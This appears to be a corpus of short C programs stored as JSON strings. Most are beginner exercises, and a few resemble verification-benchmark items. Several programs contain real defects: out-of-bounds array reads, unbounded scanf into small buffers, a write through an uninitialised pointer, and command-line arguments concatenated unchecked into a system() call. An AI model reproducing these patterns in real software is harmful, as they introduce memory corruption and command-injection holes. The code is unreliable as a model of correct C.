    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\n#include <string.h>\n#include <math.h>\nint cmp(const void* a,const void* b){return *((int*)a)-*((int*)b);}\n\n_Bool isprime(int x) {\n  if (x <= 1) return 0;\n  if (x==2 || x==3 || x==5 || x==7) return 1;\n  for(int i=2;i<sqrt(x)+1;i++)\n    if (!(x%i)) return 0;\n  return 1;\n}\nint hash[10000];\nint main() {\n  memset(hash,0xFF,sizeof(hash));\n  _Bool prtflag = 0;\n  int t;scanf(\"%d\",&t); while (!isprime(t)) t++;\n  int n;scanf(\"%d\",&n); int m;scanf(\"%d\",&m); int _n=n;while(_n--) {\n    int x;scanf(\"%d\",&x); int h = x % t;\n    _Bool ok = 0;\n    for (int i=0; !ok && i<t; i++) {\n      int idx = (h + i * i) % t;\n      if (hash[idx] == -1) {\n        hash[idx] = x;\n        ok = 1;\n      }\n    }\n    if (!ok) printf(\"%d cannot be inserted.\\n\", x);\n  }\n  int cnt = 0;\n  int _m=m;while(_m--) {\n    int x;scanf(\"%d\",&x); int h = x % t;\n    _Bool ok = 0;\n    for (int i=0; !ok && i<t; i++) {\n      cnt++;\n      int y = hash[(h + i * i) % t];\n      if (y == x) ok = 1;\n      else if (y == -1) break;\n    }\n  }\n  printf(\"%.1f\", (double) cnt / m);\n}",
    "#include <stdio.h>\nint main() {\n    int i;\n    char str[501];\n    fgets(str, 501, (stdin));\n    for(i = 0; str[i] != '\\0'; i++);\n    printf((i-1 > 140) ? \"MUTE\\n\" : \"TWEET\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nfloat SMA(float data[], int t, int N) {\n    int i;\n    float j = 0;\n    for (i=0; i<N; i++) {\n        j += data[t - i];\n    }\n    return j / N;\n}\nint main() {\n    int i;\n    float data[1245];\n    for (i=0; i<1245; i++) {\n        scanf(\"%f\", &data[i]);\n    }\n    for (i=19; i<1245; i++) {\n        printf(\"%d %.2f %.2f %.2f\\n\", i + 1, data[i], SMA(data, i, 5), SMA(data, i, 20));\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n unsigned int a = 21;\n unsigned int c;\n c = a;\n printf(\"Lin1 = Operator,  Value of c = %d\\n\", c);\n c += a;\n printf(\"Lin2 += Operator, Value of c = %d\\n\", c);\n c -+ a;\n printf(\"Lin1 -= Operator, Value of c = %d\\n\", c);\n c *= a;\n printf(\"Lin1 *= Operator, Value of c = %d\\n\", c);\n c /= a;\n printf(\"Lin1 /= Operator, Value of c = %d\\n\", c);\n c = 200;\n c %= a;\n printf(\"Lin1 %%= Operator, Value of c = %d\\n\", c);\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n int a;\n int b;\n printf(\"the first address : 0x%x\\n\", &a);\n printf(\"the second address : 0x%x\\n\", &b);\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  float distance, timing, speed;\n  printf(\"Enter distance (in km): \\n\");\n  scanf(\"%f\", &distance);\n  printf(\"Enter time (in sec): \\n\");\n  scanf(\"%f\", &timing);\n  speed = distance / timing;\n  printf(\"The speed is %.2f km/sec\", speed);\n  return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n int a[10] = {1,2,3,4,5,6,7,8,9,10};\n printf(\"%d\",a[10]);\n}",
    "#include <stdio.h>\nint sumOfDigits(int num)\n{\n    int sum = 0;\n    while(num > 0)\n    {\n        sum = sum + (num % 10);\n        num = num / 10;\n    }\n    return sum;\n}\nint reverse(int num)\n{\n    int rev = 0;\n    while(num > 0)\n    {\n        rev = (rev * 10) + (num % 10);\n        num = num / 10;\n    }\n    return rev;\n}\nint main()\n{\n    int num, sum, rev;\n    printf(\"Enter the value for a number:\");\n    scanf(\"%d\", &num);\n    sum = sumOfDigits(num);\n    if(sum < 10)\n    {\n        if((sum * sum) == num)\n        {\n            printf(\"%d is a magic number\\n\", num);\n        }\n        else\n        {\n            printf(\"%d is not a magic number\\n\", num);\n        }\n        return 0;\n    }\n    rev = reverse(sum);\n    if((sum * rev) == num)\n    {\n        printf(\"%d is a magic number\\n\", num);\n    }\n    else\n    {\n        printf(\"%d is not a magic number\\n\", num);\n    }\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nfloat randNum() {\n  return ((float) rand()/(float) ((0x7fffffff))) * 5;\n}\nint main(int argc, char **argv)\n{\n  int m, n, p;\n  m = atoi(argv[1]);\n  n = atoi(argv[2]);\n  p = atoi(argv[3]);\n  int i, j, k, result = 0;\n  float **matrix1 = (float **)malloc(m*sizeof(float *));\n  for (i = 0; i < m; i++)\n  {\n    matrix1[i] = (float *)malloc(n*sizeof(float));\n  }\n  float **matrix2 = (float *)malloc(n*sizeof(float *));\n  for (i = 0; i < n; i++)\n  {\n    matrix2[i] = (float *)malloc(p*sizeof(float));\n  }\n  float **matrixMult = (float *)malloc(m*sizeof(float *));\n  for (i = 0; i < m; i++)\n  {\n    matrixMult[i] = (float *)malloc(p*sizeof(float));\n  }\n  for(i = 0; i < m; i++)\n  {\n    for(j = 0; j < n; j++)\n    {\n      *(*(matrix1 + i) + j) = randNum();\n    }\n  }\n  for (i = 0; i < m; i++)\n  {\n    for (j = 0; j < n; j++)\n    {\n      *(*(matrix2 + i) + j) = randNum();\n    }\n  }\n  for (i = 0; i < m; i++)\n  {\n    for (j = 0; j < p; j++)\n    {\n      for (k = 0; k < n; k++)\n      {\n        result = result + (*(*matrix1 + i) + k) * (*(*matrix2 + k) + j);\n      }\n      *(*(matrixMult + i) + j) = result;\n      result = 0;\n    }\n  }\n  for (i = 0; i < m; i++)\n  {\n    for (j = 0; j < p; j++)\n    {\n      printf(\"%f \\t\", *(*(matrixMult + i) + j));\n    }\n    printf(\"\\n\");\n  }\n}",
    "#include <stdio.h>\nint main() {\n int arr[] = {0x0,0x1,0x2,0x3,0x4,5,6,7,8,9,0xa,0xb,0xc,0xd,0xe,0xf};\n unsigned long len = (unsigned long) (sizeof(arr) / sizeof(int));\n for(int i = 0; i < len; i++) {\n  printf(\"arr[%X] = %d\\t\", i, arr[i]);\n }\n printf(\"\\n\\n************************\\n\\n\");\n int n = 10;\n int arr2[n];\n unsigned long l2 = sizeof(arr2);\n unsigned long l3 = n * sizeof(int);\n printf(\"sizeof(arr2)\t\t= %ld\\n\", l2);\n printf(\"n * sizeof(int)\t\t= %ld\\n\", l3);\n return 0;\n}",
    "#include <stdio.h>\nint main (){\n    float n1, n2, n3, n4;\n    printf (\"Digite 4 notas: \");\n    scanf (\"%f %f %f %f\", &n1 ,&n2, &n3, &n4);\n    printf (\"A media aritmetica eh igual a: %.2f.\\n\", (n1 + n2 + n3 + n4) / 4);\n    return 0;\n}",
    "int main()\n{\n char f = 'd';\n char g = 'd';\n char j = f +g;\n j++;\n int k = 12;\n k = j+1;\n}",
    "#include\"stdio.h\"\n#include\"unistd.h\"\n#include\"fcntl.h\"\n#include\"sys/types.h\"\n#include\"errno.h\"\nint main()\n{\n int fd, var;\n printf(\"PID :- %ld\\n\",(long)getpid());\n fd = open(\"read.c\",(0x04000000));\n fd = open(\"read.c\",(0x04000000));\n scanf(\"%d\",&var);\n}",
    "#include <stdio.h>\nint main()\n{\n  int A, B, X; scanf(\"%d\\n%d\", &A, &B);\n  X = A + B; printf(\"X = %d\\n\", X);\n  return(0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nvoid mult_matr(int matr1[][3], int matr2[][3], int matr_res[][3], int val);\nvoid print_matr(int matr[][3], int val);\nint main()\n{\n    int val = 3;\n    static int matr1[3][3] = {\n        {4, 2, 4},\n        {3, 8, 6},\n        {4, 7, 9}\n    };\n    static int matr2[3][3] = {\n        {5, 1, 6},\n        {1, 4, 3},\n        {4, 6, 7}\n    };\n    int matr_res[3][3] = {\n        {0, 0, 0},\n        {0, 0, 0},\n        {0, 0, 0}\n    };\n    mult_matr(matr1, matr2, matr_res, 3);\n    print_matr(matr_res, val);\n    return 0;\n}\nvoid mult_matr(int matr1[][3], int matr2[][3], int matr_res[][3], int val)\n{\n    int h, i, j;\n    for (h = 0; h < val; h++){\n        for (i = 0; i < val; i++){\n            for (j = 0; j < val; j++){\n                 matr_res[h][i]+= matr1[h][j] * matr2[j][i];\n            }\n        }\n    }\n}\nvoid print_matr(int matr[][3], int val)\n{\n    int i, j;\n    for (i = 0; i < val; ++i){\n        for (j = 0; j < val; ++j){\n            printf(\"%d \", matr[i][j]);\n        }\n        printf(\"\\n\");\n    }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(){\n    char greeting[6] = {'H', 'e', 'l', 'l', 'o', '\\0'};\n    printf(\"Greeting message: %s\\n\", greeting );\n    char list[10];\n    printf(\"print a letter: \");\n    scanf(\"%s\", list);\n    printf(\"string: %s\\n\", list);\n    return 0;\n}",
    "#include<stdio.h>\nint main(){\n    float i, j, valor;\n    int temp, temp2;\n    for (i = 0, j = 1, valor = 0, temp = 0, temp2 = 0; i < 2.2; j++){\n     if(temp2 == 0){\n            printf(\"I=%.0f J=%.0f\\n\", i, j);\n        }else{\n            printf(\"I=%.1f J=%.1f\\n\", i, j);\n        }\n        temp++;\n        if(temp == 3){\n            i += 0.2;\n            valor += 0.2;\n            j = valor;\n            temp = 0;\n            temp2++;\n        }\n        if(temp2 == 5)\n            temp2 = 0;\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nfloat CelsiusFromFahrenheit(float tempF) {\n    float tempC = (tempF - 32.0) * 5.0 / 9.0;\n    printf(\"The corresponding temp in C is %.2f C. \\n\", tempC);\n    return tempC;\n}\nvoid Swap(float *a, float *b) {\n    int temp = *a;\n    *a = *b;\n    *b = temp;\n}\nint main(void) {\n    puts(\"Temp Conversions\");\n    puts(\"===========================\");\n    for (float tempF = 10.0; tempF < 100.0; tempF += 5.0) {\n        float celsius = CelsiusFromFahrenheit(tempF);\n        printf(\"%.1f F          |           %5.1f C \\n\", tempF, celsius);\n        Swap(&tempF, &celsius);\n        Swap(&tempF, &celsius);\n    }\n    puts(\"---------------------------\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main (void)\n{\n char str[21];\n int i;\n int count;\n count = 0;\n printf(\"Please enter a string > \");\n fgets(str, 21-2, (stdin));\n for (i=0; i<21; i++){\n if (str[i] == 'a')\n  count++;\n if (str[i] == 'e')\n                count++;\n if (str[i] == 'i')\n                count++;\n if (str[i] == 'o')\n                count++;\n if (str[i] == 'u')\n                count++;\n if (str[i] == 'y')\n                count++;\n }\n printf(\"The number of syllables is %d.\\n\", count);\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int n=0;\n    printf(\"Enter the number to display multiplication table: \");\n    scanf(\"%d\",&n);\n    for(int i=1;i<=10;i++)\n    {\n        printf(\"%d * %d = %d \\n\",n,i,n*i);\n    }\n    return 0;\n}",
    "#include <unistd.h>\n#include <stdio.h>\n\n\n\nint main(int argc, char *argv[]) {\n    int sleepCount = 0;\n    FILE *thisFp = fopen(\"/tmp/demo.lock\", \"r\");\n    while(thisFp != ((void*)0)) {\n        sleep(30);\n        sleepCount++;\n        if(sleepCount >= 100) {\n            return 0;\n        } else {\n            fclose(thisFp);\n            thisFp = fopen(\"/tmp/demo.lock\", \"r\");\n        }\n    }\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<time.h>\nint main()\n{\n    int number,guess,nGuesses=1;\n    srand(time(0));\n    number=rand()%100+1;\n    do\n    {\n        printf(\"Guess any number between 1 to 100 :\");\n        scanf(\"%d\", &guess);\n        if (guess>number)\n        {\n            printf(\"Lower number please \\n\");\n        }\n        else if (guess<number)\n        {\n            printf(\"Greater number please \\n\");\n        }\n        else\n        {\n            printf(\"Yayy you did it !!! \\n You took %d number attempts to guess the number\", nGuesses);\n        }\n        nGuesses++;\n    } while(guess!=number);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char *argv[]) {\n extern char **environ;\n char **str;\n int i;\n for(i = 0; i < argc; i++)\n  printf(\"argv[%d]: %s\\n\", i, argv[i]);\n for(str = environ; *str != 0; str++)\n  printf(\"%s\\n\", *str);\n exit(0);\n}",
    "#include <stdio.h>\nint main() {\n  int n;\n  scanf(\"%d\",&n);\n  while(n>0) {\n    int a,b,c,d,e,f,bom;\n    scanf(\"%d\",&bom);\n    scanf(\"%d %d %d %d %d %d\",&a,&b,&c,&d,&e,&f);\n    float n1, n2;\n    n1=(float)(a+b)/2+((c%2==0)?bom:0);\n    n2=(float)(d+e)/2+((f%2==0)?bom:0);\n    printf(\"%s\\n\",(n1==n2)?\"Empate\":((n1>n2)?\"Dabriel\":\"Guarte\"));\n    n--;\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <pthread.h>\nvoid myThread1(){\n printf(\"This line is printed by thread 1\\n\");\n return;\n}\nvoid myThread2(){\n printf(\"This is printed by thread 2\\n\");\n return;\n}\nint main(){\n pthread_t id_1;\n pthread_t id_2;\n pthread_create(&id_1, ((void*)0), (void *)myThread1, ((void*)0));\n pthread_create(&id_2, ((void*)0), (void *)myThread2, ((void*)0));\n pthread_join(id_1, ((void*)0));\n pthread_join(id_2, ((void*)0));\n printf(\"This is printed by main thread\\n\");\n return 0;\n}",
    "#include <stdio.h>\nint isprime (int a)\n{\n int f = 1;\n   if(a > 2)\n    {\n     for(int i = 2;i < a;i++)\n        {\n         if(a % i == 0)\n            {\n             f = 0;\n               break;\n            }\n        }\n    }\n   return f;\n}\nint main ()\n{\n int a[100];\n   int n;\n   int v = 0;\n   int u = 0;\n    for(int k = 0; ; k++)\n    {\n    scanf(\"%d\",&a[k]);\n     if(a[k] == 0)\n        {\n           n = k;\n           break;\n        }\n    }\n    for(int m = 0; m < n; m++)\n    {\n       if(isprime(a[m]) == 1)\n        {\n            u++;\n        }\n    }\n   for(int j = 0;j < n; j++)\n    {\n       if(isprime(a[j]) == 1)\n        {\n         printf(\"%d\",a[j]);\n         v++;\n         if(v<u){printf(\" \");}\n        }\n    }\n}",
    "#include<stdio.h>\nint main(){\n    int x=89;\n    int *p1,*p2,*p3;\n    p1=&x;\n    p2=&x;\n    p3=&x;\n    printf(\"%d\\n\",*p1);\n    printf(\"%d\\n\",*p2);\n    printf(\"%d\\n\",*p3);\n}",
    "#include <stdio.h>\nint main()\n{\n    int x = 5;\n    char c = 'H';\n    float f = 1.0f;\n    double pi = 3.14159;\n    printf(\"x v\u00e1ltoz\u00f3 m\u00e9rete byte-ban: %d\\n\", sizeof(x));\n    printf(\"c v\u00e1ltoz\u00f3 m\u00e9rete byte-ban: %d\\n\", sizeof(c));\n    printf(\"f v\u00e1ltoz\u00f3 m\u00e9rete byte-ban: %d\\n\", sizeof(f));\n    printf(\"pi v\u00e1ltoz\u00f3 m\u00e9rete byte-ban: %d\\n\", sizeof(pi));\n    puts(\"\");\n    printf(\"int t\u00edpus m\u00e9rete byte-ban: %d\\n\", sizeof(int));\n    printf(\"char t\u00edpus byte-ban: %d\\n\", sizeof(char));\n    printf(\"float t\u00edpus m\u00e9rete byte-ban: %d\\n\", sizeof(float));\n    printf(\"double t\u00edpus m\u00e9rete byte-ban: %d\\n\", sizeof(double));\n    return 0;\n}",
    "#include <err.h>\n#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char *argv[]) {\n  FILE *file = ((void*)0);\n  int n_bytes = (argc == 3) ? atoi(argv[2]) : 1;\n  int bytes_read;\n  char *c = malloc(sizeof(char) * n_bytes);\n  if (argc != 2 && argc != 3) {\n    fprintf((stderr), \"Usage: %s <file_name> [number_of_bytes]\\n\", argv[0]);\n    exit(1);\n  }\n  if ((file = fopen(argv[1], \"r\")) == ((void*)0))\n    err(2, \"The input file %s could not be opened\", argv[1]);\n  while ((bytes_read = fread(c, sizeof(char), n_bytes, file)) != 0) {\n    fwrite(c, sizeof(char), bytes_read, (stdout));\n  }\n  fclose(file);\n  return 0;\n}",
    "#include <stdio.h>\n\nint sum_helper (int acc, int n)\n{\n if (n == 1) {\n  return acc + 1;\n }\n return sum_helper(acc + n, n - 1);\n}\nint main()\n{\n int n;\n scanf(\"%d\", &n);\n printf(\"%d\\n\", (sum_helper(0, n)));\n return 0;\n}",
    "#include <stdio.h>\nint main(void){\n    int N;\n    long long pi[91] = { 0, 1, 1, 2, 3, 5, 8, 13, 21, 34,55,89,144,233,377,610,987,1597,2584,\n                    4181,6765,10946,17711,28657,46368,75025,121393,196418,317811,514229,\n                    832040,1346269,2178309,3524578,5702887,9227465,14930352,24157817,\n                    39088169,63245986,102334155,165580141,267914296,433494437,701408733,1134903170,\n                    1836311903,2971215073,4807526976,7778742049,12586269025,20365011074,\n                    32951280099,53316291173,86267571272,139583862445,225851433717,\n                    365435296162,591286729879,956722026041,1548008755920,2504730781961,\n                    4052739537881,6557470319842,10610209857723,17167680177565,27777890035288,\n                    44945570212853,72723460248141,117669030460994,190392490709135,\n                    308061521170129,498454011879264,806515533049393,1304969544928657,\n                    2111485077978050,3416454622906707,5527939700884757,8944394323791464,\n                    14472334024676221,23416728348467685,37889062373143906,61305790721611591,\n                    99194853094755497,160500643816367088,259695496911122585,420196140727489673,\n                    679891637638612258,1100087778366101931,1779979416004714189,2880067194370816120 };\n    scanf(\"%d\", &N);\n    printf(\"%lld\", pi[N]);\n}",
    "#include <stdio.h>\nint main(){\n    int n, quad;\n    printf(\"Entre com um numero positivo: \");\n    scanf(\"%d\", &n);\n    quad = n*n;\n    printf(\"Quadrado: %d\", quad);\n    return 0;\n}",
    "int main() {\n int x = 5;\n {\n  int x = x;\n  if (x == 0) {\nERROR: goto ERROR;\n  }\n }\n}",
    "#include <stdio.h>\nint Factorial( int val ){\n    if (val == 0) return 1;\n    int temp =1;\n    for (int i=2;i<=val;i++)\n     temp=temp*i;\n    return temp;\n}\nint main ()\n{\n  int FactorialArray[10] =\n    { 1,2,6,24,120,720,5040,40320,362880,3628800 };\n  for (int i = 0; i < 10; i++)\n    {\n      printf (\"Factorial [%d] is valid: [%d], Resulat Is %d and Expected resulat was %d\\n\",\n      i, Factorial (i) == FactorialArray[i] ? 1 : 0, Factorial (i), FactorialArray[i]);\n    }\n  return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main(void){\n  FILE *arquivo;\n  char *texto;\n  if ((arquivo = fopen(\"teste.txt\",\"w\")) == ((void*)0)) {\n    perror(\"O seguinte erro ocorreu\");\n    puts(\"Falha ao abrir o arquivo!\");\n  } else {\n    puts(\"Arquivo aberto com sucesso!\\n\");\n    printf(\"Insira o texto para ser salvo: \\n\\t\");\n    scanf(\"%[^\\n]\", texto);\n    fwrite(texto, sizeof(char), strlen(texto), arquivo);\n  }\n  fclose(arquivo);\n  return 0;\n}",
    "#include <stdio.h>\nint x=1;\nint a=1;\nint b=1;\nint c=1;\nint f(int input2) {\n  int y;\n  if(x==1 || input2==2)\n    a=1;\n  else\n    a=2;\n  if(x!=1 || input2==3)\n    b=3;\n  else\n    b=4;\n  if(input2!=3||input2==2)\n    c=5;\n  else\n    c=6;\n  return c;\n}\nint main() {\n  int input;\n  int output;\n  scanf(\"%d\",&input);\n  if(input!=7)\n    output=f(input);\n  else\n    output=7;\n  printf(\"%d\",output);\n  return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\n\nvoid circle(float);\nint main(void)\n{\n    float radius;\n    printf(\"Enter the raidus : \");\n    scanf(\"%f\",&radius);\n    circle(radius);\n    return 0;\n}\nvoid circle(float radius){\n    float area\n,\n    perimeter\n;\n    area=3.14159*pow(radius,2);\n    perimeter=2*3.14159*radius;\n    printf(\"Area and Circumference for circle with radius %.2f is Area = %f \\nand Circuference = %f \\n\",radius,area,perimeter);\n }",
    "#include <stdio.h>\n#include <math.h>\nint main(){\n float r,h,volume,y,areaBase;\n printf(\"Digite o valor da altura: \");\n scanf(\"%f\", &h);\n printf(\"\\n\");\n printf(\"Digite o raio da base: \");\n        scanf(\"%f\", &r);\n        printf(\"\\n\");\n y = r*r;\n areaBase = y*3.14195;\n volume = areaBase*h;\n printf(\"O volume do cilindro \u00e9 igual a %5.4f \\n\",volume);\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\nprintf(\"HelloWorld!\");\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[]) {\n  int\n foo;\n  foo = 1;\n  return 0;\n}",
    "#include <stdio.h>\n\nint main(void)\n{\n char c;\n int i, counter;\n counter = 0;\n while ((c = getchar()) != (-1)){\n  if (c == '\\n'){\n   putchar(c);\n   counter = 0;\n  }\n  else if (c == '\\t'){\n   i = counter % 8;\n   while (i++ != 8){\n    putchar(' ');\n    counter++;\n   }\n  }\n  else{\n   putchar(c);\n   counter++;\n  }\n }\n return 0;\n}",
    "#include <stdio.h>\nint main(void){\n    char s[20] = \"Hello world\";\n    FILE *fp;\n    fp = fopen(\"temp.txt\", \"w\");\n    fprintf(fp, \"%s\\n\", s);\n    fclose(fp);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdbool.h>\n#include <string.h>\nint main()\n{\n    int i,n,j,tmp;\n    scanf(\"%d\",&n);\n    int a[n];\n    for( i=0;i<n;i++) scanf(\"%d\",&a[i]);\n    for( i=0;i<n-1;i++)\n        for(j=i+1;j<n;j++)\n            if(a[i]>a[j])\n            {\n                tmp=a[j];\n                a[j]=a[i];\n                a[i]=tmp;\n            }\n    for( i=0;i<n;i++) printf(\"%d \",a[i]);\n}",
    "#include <pthread.h>\nint myglobal;\nvoid __VERIFIER_atomic_fun() {\n  myglobal=myglobal+1;\n}\nvoid *t_fun(void *arg) {\n  __VERIFIER_atomic_fun();\n  return ((void*)0);\n}\nint main(void) {\n  pthread_t id;\n  pthread_create(&id, ((void*)0), t_fun, ((void*)0));\n  __VERIFIER_atomic_fun();\n  pthread_join (id, ((void*)0));\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    float *p = ((void*)0);\n    int i, n;\n    printf(\"Digite a quantidade de numeros decimais: \");\n    scanf(\"%d\", &n);\n    p = (float *)(malloc(sizeof(float) * n));\n    if (p == ((void*)0))\n    {\n        printf(\"Nao e possivel alocar memoria!\");\n        exit(1);\n    }\n    for (i = 0; i < n; i++)\n    {\n        printf(\"Digite um numero decimal: \");\n        scanf(\"%f\", &p[i]);\n    }\n    int j, n1 = n;\n    float *p1;\n    for (i = 0; i < n; i++)\n    {\n        for (j = 0; j < n; j++)\n        {\n            if(i != j && p[i] == p[j] && p[j] != -323) {\n                p[j] = -323;\n                n1--;\n            }\n        }\n    }\n    p1 = (float *)(malloc(sizeof(float) * n1));\n    for (i = 0, j = 0; i < n; i++)\n    {\n        if(p[i] != -323) {\n            p1[j] = p[i];\n            j++;\n        }\n    }\n    for (i = 0; i < n1; i++)\n    {\n        printf(\"%.2f \", p1[i]);\n    }\n    free(p);\n    free(p1);\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n  unsigned short i, j, k;\n  i = 8, j = 9;\n  printf(\"%d\\n\", i >> (1 + j) >> 1);\n  i = 1;\n  printf(\"%d\\n\", i & ~i);\n  i = 2, j = 1, k = 0;\n  printf(\"%d\\n\", (~i & j) ^ k);\n  i = 7, j = 9, k = 9;\n  printf(\"%d\\n\", i ^ (j & k));\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint nombreA(char T[]) {\n    int i = 2;\n    int nba = 0;\n    while (T[i] != '\\0') {\n        if (T[i] == 'a' && T[i-1] == 'a') {\n            nba++;\n        }\n        i++;\n    }\n    return nba;\n}\nint main() {\n    char chaine[] = \"saalut\";\n    int nba = nombreA(chaine);\n    printf(\"La chaine contient %d suite de lettres 'aa'\\n\", nba);\n    return 0;\n}",
    "#include <stdio.h>\n\nvoid swap(int *ar, int idx1, int idx2)\n{\n int tmp = ar[idx1];\n ar[idx1] = ar[idx2];\n ar[idx2] = tmp;\n}\nint partition(int *ar, int start, int end)\n{\n int i = start;\n for (int j = start; j < end; j ++)\n  if (ar[j] < ar[end - 1])\n   swap(ar, i++, j);\n swap(ar, i, end - 1);\n return i;\n}\nvoid qsort(int *ar, int start, int end)\n{\n int pivot;\n if (start == end)\n  return;\n pivot = partition(ar, start, end);\n qsort(ar, start, pivot);\n qsort(ar, pivot + 1, end);\n}\nvoid print_ar(int *ar, int nr)\n{\n printf(\"[\");\n for(int i = 0; i < nr; i++)\n  printf(\"%d;\", ar[i]);\n printf(\"]\\n\");\n}\nint main()\n{\n int ar[10] = { 14, 18, 92, 13, 12, 6, 18, 37, 4, 10 };\n print_ar(ar, 10);\n qsort(ar, 0, 10);\n print_ar(ar, 10);\n}",
    "#include <stdio.h>\n#include <stdint.h>\n\nint main() {\n    uint16_t TestNumber = 0xFF00;\n    if(*((uint8_t *)&TestNumber) == 0x00) {\n        printf(\"Little endian\\n\");\n    }\n    else {\n        printf(\"Big endian\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/types.h>\n#include <time.h>\nint randomInteger();\nint main(int argc, char* argv[]) {\n    int c1, arg, i;\n    char c2;\n    FILE* file;\n    srand(time(0));\n    if (argc < 2){\n        fprintf((stderr),\"%s: invalid number of arguments\\n\", argv[0]);\n        exit(0);\n    }\n    else if (argc >= 2) {\n        arg = strtol(argv[1], ((void*)0), 0);\n        if ((argc == 4) && (argv[3] == \">\")) {\n            file = fopen (argv[4], \"w\");\n            for (i = 0; i < arg; i++) {\n                c1 = randomInteger();\n                c2 = c1;\n                fprintf(file, \"%c\", c2);\n            }\n            fprintf(file, \"\\n\");\n        }\n        else {\n            for (i = 0; i < arg; i++) {\n                c1 = randomInteger();\n                c2 = c1;\n                printf(\"%c\", c1, c2);\n            }\n            printf(\"\\n\");\n        }\n    }\n    return 0;\n}\nint randomInteger() {\n    int num = (rand() % (92 - 65)) + 65;\n    if (num == 91) {\n        num = 32;\n    }\n    return num;\n}",
    "#include <stdio.h>\nint main()\n{\n int pokey;\n int *p;\n p = &pokey;\n printf(\"The address of `pokey` is %p\\n\",&pokey);\n printf(\"The address of `p` is %p\\n\",p);\n return(0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nstatic char cmdbuf[1024];\nint main(int argc, char **argv)\n{\n int n;\n strcpy(cmdbuf,\"zxcc libr.com \");\n for (n = 1; n < argc; n++)\n {\n  if (n == 1)\n  {\n   strcat(cmdbuf,\"-\");\n  }\n  strcat(cmdbuf,argv[n]);\n  strcat(cmdbuf,\" \");\n }\n return system(cmdbuf);\n}",
    "#include <stdio.h>\n#include <stdbool.h>\ndouble pwr(double num, int power);\nint main(int argc, char * argv[])\n{\n        int pass;\n        double num;\n        int power;\n        double answer;\n        if (argc != 3)\n                puts(\"Invalid number of arguments.\");\n        else {\n                if ((pass = sscanf(argv[1], \"%lf\", &num)) == 1) {\n                        if ((pass = sscanf(argv[2], \"%d\", &power)) == 1) {\n                                answer = pwr(num, power);\n                                printf(\"%g^%d = %g\\n\", num, power, answer);\n                        } else\n                                puts(\"Something happened.\");\n                } else\n                        puts(\"Something happened.\");\n        }\n        return 0;\n}\ndouble pwr(double num, int power)\n{\n        double ret;\n        _Bool inverse = 0;\n        int i;\n        if (num == 0) {\n                ret = 0;\n                if (power == 0)\n                        puts(\"0 to the 0 is undefined, using 0 for simplicity\");\n        } else {\n                if (power < 0) {\n                        power = -power;\n                        inverse = 1;\n                }\n                ret = 1;\n                for (i = 1; i <= power; i++)\n                        ret *= num;\n                if (inverse)\n                        ret = 1 / ret;\n        }\n        return ret;\n}",
    "#include <stdio.h>\nfloat media(int *notas, int qtd);\nint main(void)\n{\n    int qtd;\n    float mediaNotas;\n    printf(\"Digite a quantidade de notas: \");\n    scanf(\"%d\", &qtd);\n    int notas[qtd];\n    for(int i = 0; i < qtd; i++)\n    {\n        printf(\"Digite a nota %d: \", i+1);\n        scanf(\"%d\", &notas[i]);\n    }\n    mediaNotas = media(notas, qtd);\n    printf(\"A media das notas e: %f\", mediaNotas);\n    return 0;\n}\nfloat media(int *notas, int qtd)\n{\n    int soma = 0;\n    for(int i = 0; i < qtd; i++)\n        soma += notas[i];\n    return soma / (float)qtd;\n}",
    "#include <sys/types.h>\n#include <unistd.h>\n#include<stdio.h>\nint main()\n{\n if(getpid()==0x1337)\n {\n  printf(\"It was hidden!\\n\");\n }\n return 0;\n}",
    "#include <stdio.h>\nvoid transitionTable(char *query, int M, int TF[][256]){\n    int i, lps=0, x;\n    for(x=0; x<256; x++) TF[0][x]=0;\n    TF[0][query[0]]=1;\n    for(i=1; i<=M; i++){\n        for(x=0; x<256; x++) TF[i][x]=TF[lps][x];\n        TF[i][query[i]]=i+1;\n        if(i<M) lps = TF[lps][query[i]];\n    }\n}\nvoid patternMatching2(char *query, char *mainString){\n    int M = 0, N = 0;\n    while(mainString[N]!='\\0') N++;\n    while(query[M]!='\\0') M++;\n    int TF[M+1][256];\n    transitionTable(query, M, TF);\n    int i, j=0;\n    for(i=0; i<N; i++){\n        j=TF[j][mainString[i]];\n        if(j==M) printf(\"%d\\t\", i-M+1);\n    }\n}\nint main(){\n    char str[100]=\"Tomay Amar Shonar Bangla, Ami Tomay Valobashi! Tomay!\", query[100]=\"Tomay\";\n    patternMatching2(query, str);\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int c;\n    int nb;\n    int prec = -1;\n    while ((c = getchar()) != (-1)) {\n        if (c == ' ' && prec == ' ')\n            continue;\n        else {\n            putchar(c);\n            prec = c;\n        }\n    }\n}",
